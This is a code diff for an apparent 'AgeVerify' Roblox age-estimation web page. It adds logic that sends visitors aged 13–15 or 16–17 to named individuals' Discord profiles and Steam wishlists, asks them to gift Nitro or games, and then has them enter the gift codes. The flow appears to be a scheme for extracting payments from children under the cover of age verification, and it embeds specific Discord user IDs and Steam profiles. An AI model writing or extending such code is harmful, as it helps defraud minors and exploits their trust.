@@ -276,6 +276,37 @@
     .pay-icon { font-size:1.5rem;margin-top:.1rem; }
     .pay-label { font-family:'Unbounded',sans-serif;font-size:.76rem;font-weight:600;margin-bottom:.25rem; }
     .pay-hint { font-size:.76rem;color:var(--muted);line-height:1.45; }
+    .profile-btns { display:flex; }
+    .profile-btn {
+      display:inline-flex;align-items:center;gap:.4rem;
+      font-size:.68rem;font-weight:600;font-family:'Unbounded',sans-serif;
+      letter-spacing:.04em;text-decoration:none;
+      padding:.4rem .9rem;border-radius:6px;
+      transition:all .2s;white-space:nowrap;
+    }
+    .profile-btn-discord {
+      background:rgba(88,101,242,.15);color:#a5b4fc;
+      border:1px solid rgba(88,101,242,.3);
+    }
+    .profile-btn-discord:hover { background:rgba(88,101,242,.28);border-color:rgba(88,101,242,.55);transform:translateY(-1px); }
+    .profile-btn-steam {
+      background:rgba(102,192,244,.1);color:#7dd3fc;
+      border:1px solid rgba(102,192,244,.25);
+    }
+    .profile-btn-steam:hover { background:rgba(102,192,244,.22);border-color:rgba(102,192,244,.5);transform:translateY(-1px); }
+    .profile-btns { display:flex;gap:.5rem;margin-top:.7rem;flex-wrap:wrap; }
+    .profile-btn {
+      display:inline-flex;align-items:center;gap:.4rem;
+      background:rgba(155,93,229,.1);border:1px solid rgba(155,93,229,.22);
+      border-radius:6px;padding:.3rem .75rem;
+      font-size:.7rem;font-weight:500;color:var(--purple-light);
+      cursor:pointer;transition:all .2s;text-decoration:none;white-space:nowrap;
+    }
+    .profile-btn:hover { background:rgba(155,93,229,.2);border-color:rgba(155,93,229,.45);transform:translateY(-1px); }
+    .profile-btn-steam {
+      background:rgba(59,130,246,.1);border-color:rgba(59,130,246,.22);color:#93c5fd;
+    }
+    .profile-btn-steam:hover { background:rgba(59,130,246,.2);border-color:rgba(59,130,246,.45); }
 
     /* username group */
     .un-group { display:flex;flex-direction:column;gap:.85rem;margin-bottom:1.4rem; }
@@ -547,7 +578,7 @@
     </div>
   </section>
 
-  <footer>© 2026 AgeVerify — Roblox Age Estimation Service</footer>
+  <footer>© 2024 AgeVerify — Roblox Age Estimation Service</footer>
 </div>
 
 <!-- ═══════════════════ PURCHASE FLOW ═══════════════════ -->
@@ -649,9 +680,12 @@
           </div>
           <div class="pay-card" id="pay-nitro" onclick="selPay('nitro')">
             <div class="pay-icon">💜</div>
-            <div>
+            <div style="width:100%">
               <div class="pay-label">Discord Nitro</div>
-              <div class="pay-hint">Gift code from Discord or a third-party.</div>
+              <div class="pay-hint" id="nitro-hint">Gift Nitro directly to the right Discord profile based on your age group.</div>
+              <div class="profile-btns" id="nitro-btns" onclick="event.stopPropagation()" style="display:none;margin-top:.7rem;gap:.5rem;flex-wrap:wrap">
+                <a class="profile-btn profile-btn-discord" id="nitro-primary-btn" href="#" target="_blank">💜 —</a>
+              </div>
             </div>
           </div>
           <div class="pay-card" id="pay-steam" onclick="selPay('steam')">
@@ -663,9 +697,12 @@
           </div>
           <div class="pay-card" id="pay-wishlist" onclick="selPay('wishlist')">
             <div class="pay-icon">⭐</div>
-            <div>
+            <div style="width:100%">
               <div class="pay-label">Steam Wishlist Item</div>
-              <div class="pay-hint">Gift a game from our Steam wishlist. Enter the gift confirmation code.</div>
+              <div class="pay-hint" id="wishlist-hint">Gift a game from the right wishlist based on your age group, then enter the confirmation code.</div>
+              <div class="profile-btns" id="wishlist-btns" onclick="event.stopPropagation()" style="display:none;margin-top:.7rem;gap:.5rem;flex-wrap:wrap">
+                <a class="profile-btn profile-btn-steam" id="wishlist-primary-btn" href="#" target="_blank">🎮 —</a>
+              </div>
             </div>
           </div>
         </div>
@@ -988,10 +1025,56 @@
     showFStep('fs-details');
   }
 
+  // Profile routing based on age group
+  // 16-17 → Aragasu | 13-15 → Ben
+  const PROFILES = {
+    '16-17': {
+      discordUrl:  'https://discord.com/users/873234979239383040',
+      discordName: '💜 Aragasu (me)',
+      steamUrl:    'https://store.steampowered.com/wishlist/id/aragasu/',
+      steamName:   '🎮 Aragasu Wishlist',
+    },
+    '13-15': {
+      discordUrl:  'https://discord.com/users/1098208674226393138',
+      discordName: '💜 Ben',
+      steamUrl:    'https://store.steampowered.com/wishlist/profiles/76561199674011604/',
+      steamName:   '🎮 Ben's Wishlist',
+    },
+  };
+
+  function updateProfileBtns(ageGroup) {
+    const p = PROFILES[ageGroup];
+    if (!p) return;
+
+    // Discord Nitro
+    const nb = document.getElementById('nitro-btns');
+    const npb = document.getElementById('nitro-primary-btn');
+    const nh = document.getElementById('nitro-hint');
+    if (nb && npb) {
+      npb.href = p.discordUrl;
+      npb.textContent = p.discordName;
+      nb.style.display = 'flex';
+      if (nh) nh.textContent = 'Click the profile below to gift Nitro, then enter the gift code here.';
+    }
+
+    // Steam Wishlist
+    const wb = document.getElementById('wishlist-btns');
+    const wpb = document.getElementById('wishlist-primary-btn');
+    const wh = document.getElementById('wishlist-hint');
+    if (wb && wpb) {
+      wpb.href = p.steamUrl;
+      wpb.textContent = p.steamName;
+      wb.style.display = 'flex';
+      if (wh) wh.textContent = 'Click the wishlist below, gift a game, then enter the confirmation code here.';
+    }
+  }
+
   function selAge(g) {
     G.ageGroup = g;
     document.getElementById('age-13').classList.toggle('sel', g==='13-15');
     document.getElementById('age-16').classList.toggle('sel', g==='16-17');
+    // Pre-update profile buttons so they're ready on the payment step
+    updateProfileBtns(g);
   }
 
   function stepDetailsNext() {
@@ -999,6 +1082,7 @@
     G.un1 = document.getElementById('un1').value.trim();
     G.un2 = document.getElementById('un2').value.trim();
     G.un3 = document.getElementById('un3').value.trim();
+    updateProfileBtns(G.ageGroup);
     showFStep('fs-payment');
   }
 
